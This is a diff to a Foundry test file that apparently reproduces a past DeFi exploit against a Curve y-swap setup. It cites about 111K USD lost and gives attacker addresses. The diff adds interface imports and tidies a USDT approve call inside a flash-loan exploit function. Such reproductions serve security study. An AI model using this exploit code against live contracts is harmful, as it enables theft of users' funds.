@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IcurveYSwap} from "src/interfaces/IcurveYSwap.sol";
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // @KeyInfo - Total Lost : ~111K USD$
 // Attacker : https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671
 // Attack Contract : https://etherscan.io/address/0x7c28e0977f72c5d08d5e1ac7d52a34db378282b3
@@ -42,7 +48,9 @@ contract ContractTest is Test {
 
     function testExploit() external {
         USDC.approve(address(curveYSwap), type(uint256).max);
-        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(curveYSwap), type(uint256).max));
+        (bool success2,) = address(USDT).call(
+            abi.encodeWithSignature("approve(address,uint256)", address(curveYSwap), type(uint256).max)
+        );
         Pair.flash(address(this), 0, 120_000 * 1e6, new bytes(1));
 
         emit log_named_decimal_uint(
